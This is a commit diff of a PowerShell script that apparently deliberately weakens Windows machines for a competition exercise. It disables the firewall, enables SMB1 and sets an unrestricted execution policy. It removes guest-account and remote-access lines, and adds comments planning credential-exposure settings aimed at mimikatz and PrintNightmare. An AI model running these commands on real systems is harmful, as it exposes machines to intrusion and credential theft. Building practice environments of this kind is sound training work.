78d0786ae560c4074de6388aa5d14c5098f6c048
megatop1 <43348736+megatop1@users.noreply.github.com>
2021-12-06 10:50:51 -0500

    Update DeployBadLocalPolicies.ps1

--- Windows/Weakening/DeployBadLocalPolicies.ps1
+++ Windows/Weakening/DeployBadLocalPolicies.ps1
@@ -1,15 +1,16 @@
 # Disable Firewall Fully
 netsh advfirewall set AllProfiles state off 
 
-#Enable the Guest Account
-net user guest /active:yes
-
-#Add the guest user to the remote desktop group
-NET LOCALGROUP "Remote Desktop Users" guest /ADD
-
-NET LOCALGROUP "Remote Management Users" guest /ADD
-
 # Enable SMB1
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 1 -Force
 
 Set-ExecutionPolicy -ExecutionPolicy unrestricted
+
+# Enable Windows to Store LAN Manager Hash
+# Enable Print-Spooler Service https://www.digitalwelt.org/en/tips/software/disable-services-state-through-regedit
+# Enable Plaintext Passwords
+# Disable LSA to make system vulnerable to mimikatz
+# Enable WDigest to make system vulnerable to mimikat
+# Always install elevated AlwaysInstallElevated (always installs with admin rights)
+# Make vulnerable to Print Nightmare
+# Disable Scored Services if Team is losing (RDP, SMB, PSEXEC, etc)
